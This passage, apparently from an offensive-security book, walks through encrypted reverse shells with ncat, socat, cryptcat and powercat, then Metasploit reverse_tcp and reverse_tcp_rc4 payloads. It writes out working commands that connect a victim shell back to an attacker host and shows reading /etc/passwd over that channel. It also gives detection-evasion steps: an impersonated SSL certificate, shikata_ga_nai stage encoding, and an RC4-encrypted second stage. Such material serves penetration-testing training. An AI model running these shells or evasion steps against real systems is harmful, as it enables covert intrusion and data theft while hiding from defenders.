### Analyzing the `tcpdump` Trace for Encrypted Communication

Let's examine the `tcpdump` trace for the following command:

> ![](media/image289.png)

In the preceding screenshot, you can see that the communication between the attacker and the victim machine is encrypted. However, using the default settings of `ncat` can be problematic. The SSL certificate in use is automatically generated by `ncat`, which can be detected by a network administrator by examining the SSL certificate:

> ![](media/image290.jpeg)

To address this issue, we can use a custom SSL certificate. For example, let's use an SSL certificate impersonated from a trusted source (SSL impersonation will be discussed later in this chapter):

> ![](media/image291.png)
```bash
ncat -l 8080 --ssl -v --ssl-key /Users/Harry/.msf4/loot/20180819233217_default_83.166.16
```

When the victim machine attempts to connect back to the attacker machine, the impersonated SSL certificate is used:

> ![](media/image292.jpeg)

Let's verify the `tcpdump` trace for the SSL certificate:

> ![](media/image293.jpeg)

Using `ncat` is a good practice, and it is supported on Windows. If `socat` is installed on the target server instead of `ncat`, no problem! We can still establish an encrypted reverse shell.

### Encrypted Reverse Shell Using `socat`

`socat` is a utility tool similar to `netcat` that supports communication using various protocols, as well as through files, pipes, and sockets. It also offers features like forking, logging, and dumping for interprocess communication. In short, `socat` is highly versatile.

To check if `socat` is installed on the target server, use the following command:

```bash
which socat
```

> ![](media/image294.jpeg)

To start an encrypted listener on port 8000 on the attacker machine, use the following command:

```bash
openssl s_server -quiet -key key.pem -cert cert.pem -port 8000
```

> ![](media/image295.jpeg)

On the victim machine, execute the following command to establish a reverse shell connection:

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane openssl-connect:192.168.2.6:8000,key
```

> ![](media/image296.jpeg)

Upon successful execution, a reverse shell will be established on the attacker machine:

> ![](media/image297.jpeg)

Let's try to execute the `id` command:

> ![](media/image298.jpeg)

As shown in the following screenshot, the output is encrypted:

> ![](media/image299.jpeg)

If we prefer not to use SSL, we can use `cryptcat`, which supports encrypted communication using the Twofish cipher algorithm.

### Encrypted Reverse Shell Using `cryptcat`

`cryptcat` is a tool based on `netcat` that is enhanced with Twofish encryption. Download the tool from [the official source] and untar it. The following file will reside in the `cryptcat` directory after downloading:

> ![](media/image300.jpeg)

Build the package using the following command:

```bash
make linux
```

> ![](media/image301.jpeg)

A binary file named `cryptcat` will be generated in the same directory:

> ![](media/image302.jpeg)

Execute the `cryptcat` binary with the `-h` option to view the help screen:

```bash
./cryptcat -h
```

> ![](media/image303.jpeg)

The output is similar to `netcat`, with the addition of the `-k` option, which is used to set the shared secret for Twofish encryption.

Start the listener on the attacker machine with the shared secret set to `harry123`:

```bash
./cryptcat -lvp 8000 -k "harry123"
```

> ![](media/image304.jpeg)

The listener is now ready for incoming connections. On the victim machine, execute the following command:

```bash
rm -rf /tmp/a; mkfifo /tmp/a; ./cryptcat 192.168.2.14 8000 -k "harry123" 0< /tmp/a
```

> *Note: `cryptcat` needs to be delivered to the target server for execution.*

Upon successful execution, a reverse shell will be established on the attacker machine. Let's execute the `id` and `uname -a` commands:

> ![](media/image306.jpeg)

On the `tcpdump` trace terminal, we can see that the communication is encrypted:

> ![](media/image307.jpeg)

Let's execute the `cat /etc/passwd` command to retrieve the password file in Linux:

> ![](media/image308.jpeg)

Congratulations! We have successfully exfiltrated the Linux password file using a secure communication channel. Data exfiltration will be covered in further chapters.

> ![](media/image309.jpeg)

For Windows users: if you are unable to run `ncat.exe`, `nc.exe`, or `cryptcat` on Windows, you can use `powercat`. However, `powercat` does not support encryption.

### Reverse Shell Using `powercat`

`powercat` is a utility tool similar to `netcat` but written in PowerShell. It includes additional features such as sending data over TCP, UDP, and DNS, connection relays, and payload generation.

Download `powercat` from [the official source]. To start using `powercat`, import the `powercat.ps1` module into PowerShell:

> ![](media/image310.jpeg)

Execute the following command to bring up the help screen:

```powershell
powercat -h
```

> ![](media/image311.jpeg)

From here, you can use `powercat` just like a normal `netcat`.

### Using Metasploit for Reverse Shells

Metasploit can generate various reverse shell connection payloads. The most common is the `reverse_tcp` payload.

#### Generating a `reverse_tcp` Payload

Generate a Windows-based `reverse_tcp` payload using the following command:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<attacker_port> -f exe -o payload.exe
```

> ![](media/image312.jpeg)

Start the listener on the attacker machine:

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT <attacker_port>
set ExitOnSession false
run
```

> ![](media/image313.jpeg)

Execute the payload on the target server:

> ![](media/image314.jpeg)

Upon execution, the target server connects back to the specified port on the attacker machine:

> ![](media/image315.jpeg)

The handler receives a connection request from the target server and sends the second stage payload. If everything goes well, a Meterpreter session will be opened:

> ![](media/image316.jpeg)

However, this method can alert the organization to your presence. The second stage delivered to the target server is an executable PE file (DLL), which can be detected by the organization based on certain strings sent in plain text, such as the PE executable header, "This program cannot be run in DOS mode," and "metsrv.dll."

#### What is `metsrv`?

`metsrv` is responsible for SSL negotiation and encrypted communication. Here is the process for opening a valid Meterpreter session:

1. The handler listens for incoming connections on a given IP and port.
2. The stager (Meterpreter payload) is executed on the target server.
3. The handler receives a new connection from the stager.
4. A connection is established back to the handler on the given IP and port by the stager.
5. The handler generates the stage (`metsrv.dll`) and sends a 4-byte block representing the size of the stage.
6. The stager reads these 4 bytes and allocates a block of memory with readable, writable, and executable (RWX) permissions.
7. The handler sends the payload to the stager.
8. The stager writes the stage (`metsrv.dll`) to the allocated block of memory.
9. The stager passes execution flow to the beginning of `metsrv.dll`.
10. `metsrv` patches the DOS header and loads itself into memory using reflective DLL injection.
11. `metsrv` calculates the offset to the session configuration block and patches it to use the socket already in use by the stager.
12. `metsrv` executes the `dllmain()` function and passes the execution flow to the configuration block.
13. `metsrv` handles SSL negotiation on the socket for encrypted communication.
14. The handler waits for a valid Meterpreter session, which is only valid if SSL negotiation is successful, basic system information is retrieved, and necessary modules are loaded.

While sending `metsrv.dll` to the stager, the payload is not encrypted, making it detectable. To hide the "This program cannot be run in DOS mode" and `metsrv.dll` strings, you can either use an encrypted payload or encode the second stage. Use the following commands to enable encoding:

```bash
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai
```

> ![](media/image319.jpeg)

Assuming the handler settings are as described:

> ![](media/image320.jpeg)

The handler will encode the second stage using the `x86/shikata_ga_nai` encoder and send it to the target server:

> ![](media/image321.jpeg)

As shown in the following screenshot, the encoded second stage does not contain the detectable strings:

> ![](media/image322.jpeg)

An alternative method is to use a payload that offers encryption, such as `reverse_tcp_rc4`.

#### Using `reverse_tcp_rc4` Payload

This Metasploit payload is a reverse Meterpreter payload with RC4 encryption. Generate the payload with the following commands:

```bash
use payload windows/meterpreter/reverse_tcp_rc4
set LHOST <attacker_ip>
set LPORT <attacker_port>
set RC4PASSWORD <password>
generate -t exe -f payload.exe
```

> ![](media/image323.jpeg)

In this scenario, we used "BabaBabaBlackSheep" as the RC4 password. Note that only the second stage is encrypted, not the stager. Set up the handler with the same RC4 password:

```bash
use exploit/multi/handler
set LHOST <attacker_ip>
set LPORT <attacker_port>
set PAYLOAD windows/meterpreter/reverse_tcp_rc4
set RC4PASSWORD <password>
set ExitOnSession false
run -j
```

> ![](media/image325.jpeg)

The handler is up and running, waiting for the stage request from the stager. When the stager is executed, a Meterpreter session will be established:

> ![](media/image326.jpeg)

The encrypted second stage looks like this:

> ![](media/image327.jpeg)

If the RC4 password is incorrect, the stager will fail to decrypt the second stage, and the session will not work. For example, if we use "ThisIsAWrongPassword" as the RC4 password:

> ![](media/image328.jpeg)

The session will not work, and no information will be retrieved from the target server:

```bash
sessions -l
```

> ![](media/image330.jpeg)

Trying to interact with the session will result in an error:

```bash
sessions -i 3
```

> ![](media/image331.jpeg)

When we tried to execute the `getuid`, `getpid`, and `sysinfo` Meterpreter commands, they failed due to the incorrect RC4 password.